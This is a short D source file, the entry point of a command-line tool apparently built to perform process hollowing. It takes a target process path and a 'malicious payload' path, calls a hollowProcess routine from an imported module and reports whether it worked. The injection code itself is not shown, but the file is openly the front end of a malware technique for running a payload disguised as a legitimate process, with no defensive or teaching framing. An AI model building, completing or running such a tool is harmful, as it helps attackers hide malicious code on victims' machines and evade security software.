module app;

import std.stdio;
import hollowing;

void main(string[] args) {
    if (args.length != 3) {
        writeln("Usage: process_hollowing <target_process_path> <malicious_payload>");
        return;
    }

    string targetProcess = args[1];
    string payloadPath = args[2];

    try {
        hollowProcess(targetProcess, payloadPath)
            .match(
                (result) => writeln("Process hollowing successful: ", result),
                (err) => writeln("Process hollowing failed: ", err)
            );
    } catch (Exception e) {
        writeln("Unexpected error: ", e.msg);
    }
}
